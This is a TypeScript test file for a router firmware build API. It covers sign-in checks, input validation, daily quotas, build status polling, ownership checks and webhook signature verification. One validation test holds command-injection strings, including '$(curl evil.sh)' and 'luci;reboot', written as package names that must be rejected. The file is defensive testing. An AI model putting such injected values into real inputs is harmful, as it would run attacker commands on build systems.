// API tests for the build routes: auth wall (mock session), validation 400s, quota 429,
// status polling through GET, ownership checks, and the workflow_run webhook signature +
// status mapping. Runs against the in-memory DB and mock executor (APP_MODE unset).
// The mock session is always user mock-user-1, so tests isolate quota by moving the fake
// clock to a fresh UTC day per test.
import { createHmac, randomUUID } from 'node:crypto'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

// next-auth does not resolve under the vitest node environment; the mock session path never
// calls auth(), so stub the module (same pattern as tests/lib/session.test.ts).
vi.mock('@/lib/auth', () => ({ auth: vi.fn() }))

import { GET } from '@/app/api/builds/[id]/route'
import { POST } from '@/app/api/builds/route'
import { POST as webhookPOST } from '@/app/api/webhooks/build/route'
import type { BuildStatusView } from '@/lib/builds'
import { getCatalog } from '@/lib/catalog'
import { getDb } from '@/lib/db'

// Instantiate the process-wide singletons while APP_MODE is unset (memory DB / mock executor),
// so webhook tests that later set APP_MODE=real still hit the same in-memory instances.
getDb()

const device = getCatalog().devices.find((d) => d.builds.length > 0)!
const combo = {
  distro: device.builds[0].distro,
  version: device.builds[0].version,
  target: device.builds[0].target,
  profileId: device.builds[0].profileId,
}

function validBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return { ...combo, packages: ['luci'], config: { hostname: 'my-router' }, ...overrides }
}

function post(body: unknown) {
  return POST(
    new Request('http://localhost/api/builds', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: typeof body === 'string' ? body : JSON.stringify(body),
    }),
  )
}

function get(id: string) {
  return GET(new Request(`http://localhost/api/builds/${id}`), { params: Promise.resolve({ id }) })
}

function postWebhook(payload: string, signature?: string) {
  return webhookPOST(
    new Request('http://localhost/api/webhooks/build', {
      method: 'POST',
      headers: signature ? { 'x-hub-signature-256': signature } : {},
      body: payload,
    }),
  )
}

function sign(payload: string, secret: string): string {
  return `sha256=${createHmac('sha256', secret).update(payload).digest('hex')}`
}

async function pollUntilTerminal(id: string): Promise<BuildStatusView> {
  for (let i = 0; i < 10; i++) {
    const res = await get(id)
    expect(res.status).toBe(200)
    const view = (await res.json()) as BuildStatusView
    if (view.status !== 'queued' && view.status !== 'building') return view
  }
  throw new Error('build never reached a terminal state')
}

// Each test gets its own UTC day so the fixed mock user's daily quota never bleeds between tests.
let dayCounter = 0
function today(): Date {
  return new Date(Date.UTC(2026, 7, dayCounter, 12, 0, 0))
}

beforeEach(() => {
  dayCounter += 1
  vi.useFakeTimers()
  vi.setSystemTime(today())
})

afterEach(() => {
  vi.useRealTimers()
  delete process.env.MOCK_LOGGED_OUT
  delete process.env.APP_MODE
  delete process.env.BUILD_WEBHOOK_SECRET
})

describe('POST /api/builds', () => {
  it('returns 401 with a sign-in URL when logged out', async () => {
    process.env.MOCK_LOGGED_OUT = '1'
    const res = await post(validBody())
    expect(res.status).toBe(401)
    expect(await res.json()).toEqual({ error: expect.any(String), signInUrl: '/api/auth/signin' })
  })

  it('returns 400 for invalid JSON', async () => {
    expect((await post('{not json')).status).toBe(400)
  })

  it('returns 400 for a device combination that is not in the catalog', async () => {
    const res = await post(validBody({ version: '0.0.0' }))
    expect(res.status).toBe(400)
    expect((await res.json()).error).toMatch(/not in the catalog/)
  })

  it('returns 400 for package names with shell metacharacters', async () => {
    for (const pkg of ['luci;reboot', '$(curl evil.sh)']) {
      const res = await post(validBody({ packages: [pkg] }))
      expect(res.status).toBe(400)
      expect((await res.json()).error).toMatch(/Invalid package name/)
    }
  })

  it('returns 400 naming the field for non-whitelisted config keys', async () => {
    for (const field of ['pppoeUser', 'sshAuthorizedKeys', 'uciDefaults']) {
      const res = await post(validBody({ config: { [field]: 'x' } }))
      expect(res.status).toBe(400)
      const { error } = await res.json()
      expect(error).toContain(`"${field}"`)
      expect(error).toMatch(/not accepted/)
    }
  })

  it('creates a build and returns 201 with its id', async () => {
    const res = await post(validBody())
    expect(res.status).toBe(201)
    const body = await res.json()
    expect(body).toEqual({ id: expect.any(String), queuePosition: expect.any(Number) })
    expect(await getDb().builds.get(body.id)).not.toBeNull()
  })

  it('returns 429 with the next UTC midnight once the daily quota is used', async () => {
    expect((await post(validBody())).status).toBe(201)
    const res = await post(validBody())
    expect(res.status).toBe(429)
    const body = await res.json()
    const expectedReset = new Date(today())
    expectedReset.setUTCHours(24, 0, 0, 0)
    expect(body.resetAt).toBe(expectedReset.toISOString())
  })
})

describe('GET /api/builds/[id]', () => {
  it('returns 401 when logged out', async () => {
    process.env.MOCK_LOGGED_OUT = '1'
    expect((await get(randomUUID())).status).toBe(401)
  })

  it('returns 404 for an unknown build id', async () => {
    const res = await get(randomUUID())
    expect(res.status).toBe(404)
  })

  it("returns 403 for another user's build", async () => {
    const spec = { ...combo, profile: combo.profileId, packages: [], config: {}, communityPackages: [], uiLanguage: 'en' }
    const foreign = await getDb().builds.create({ userId: 'someone-else', spec })
    expect((await get(foreign.id)).status).toBe(403)
  })

  it('polls a build to success with a complete artifact', async () => {
    const created = await (await post(validBody())).json()
    const view = await pollUntilTerminal(created.id)
    expect(view.status).toBe('success')
    expect(view.log).toMatch(/sha256 checksums/)
    expect(view.artifact).toEqual({
      url: expect.stringMatching(/^https:\/\//),
      sha256: expect.stringMatching(/^[0-9a-f]{64}$/),
      sizeBytes: expect.any(Number),
      expiresAt: expect.any(String),
    })
    expect(view.artifactExpiresAt).toBe(view.artifact?.expiresAt)
  })

  it('surfaces the package-conflict hint without refunding quota', async () => {
    const created = await (await post(validBody({ packages: ['mock-fail-conflict'] }))).json()
    const view = await pollUntilTerminal(created.id)
    expect(view.status).toBe('failed')
    expect(view.failureHint).toBe('package-conflict')
    expect(view.quotaRefunded).toBe(false)
    expect(view.quotaResetAt).toBeDefined()
    // Quota stays consumed: a second build the same day is still rejected.
    expect((await post(validBody())).status).toBe(429)
  })

  it('refunds quota on timeout so the user can build again the same day', async () => {
    const created = await (await post(validBody({ packages: ['mock-timeout'] }))).json()
    const view = await pollUntilTerminal(created.id)
    expect(view.status).toBe('timeout')
    expect(view.quotaRefunded).toBe(true)
    // Refunded: the same day allows another build.
    expect((await post(validBody())).status).toBe(201)
    // Idempotent: polling the timed-out build again must not refund a second unit.
    const again = await get(created.id)
    expect(again.status).toBe(200)
    expect((await post(validBody())).status).toBe(429)
  })
})

describe('POST /api/webhooks/build', () => {
  const secret = 'test-webhook-secret'

  function runPayload(externalId: string, conclusion: string): string {
    return JSON.stringify({ workflow_run: { display_title: `Build ${externalId}`, conclusion } })
  }

  /** Creates a build via the API (mock mode) and returns { id, externalId }. */
  async function createBuild(): Promise<{ id: string; externalId: string }> {
    const created = await (await post(validBody())).json()
    const build = await getDb().builds.get(created.id)
    return { id: created.id, externalId: build!.externalId! }
  }

  it('is not exposed in mock mode (404)', async () => {
    const res = await postWebhook('{}', 'sha256=whatever')
    expect(res.status).toBe(404)
  })

  it('rejects a bad signature with 401 and leaves the build untouched', async () => {
    const { id, externalId } = await createBuild()
    process.env.APP_MODE = 'real'
    process.env.BUILD_WEBHOOK_SECRET = secret
    const payload = runPayload(externalId, 'success')
    const res = await postWebhook(payload, sign(payload, 'wrong-secret'))
    expect(res.status).toBe(401)
    expect((await getDb().builds.get(id))?.status).toBe('queued')
  })

  it('accepts a signed delivery and maps the conclusion onto the build', async () => {
    const { id, externalId } = await createBuild()
    process.env.APP_MODE = 'real'
    process.env.BUILD_WEBHOOK_SECRET = secret
    const payload = runPayload(externalId, 'failure')
    const res = await postWebhook(payload, sign(payload, secret))
    expect(res.status).toBe(204)
    expect((await getDb().builds.get(id))?.status).toBe('failed')
  })

  it('maps timed_out to the timeout status', async () => {
    const { id, externalId } = await createBuild()
    process.env.APP_MODE = 'real'
    process.env.BUILD_WEBHOOK_SECRET = secret
    const payload = runPayload(externalId, 'timed_out')
    await postWebhook(payload, sign(payload, secret))
    expect((await getDb().builds.get(id))?.status).toBe('timeout')
  })

  it('acknowledges unknown build ids without side effects', async () => {
    process.env.APP_MODE = 'real'
    process.env.BUILD_WEBHOOK_SECRET = secret
    const payload = runPayload(randomUUID(), 'success')
    expect((await postWebhook(payload, sign(payload, secret))).status).toBe(204)
  })
})
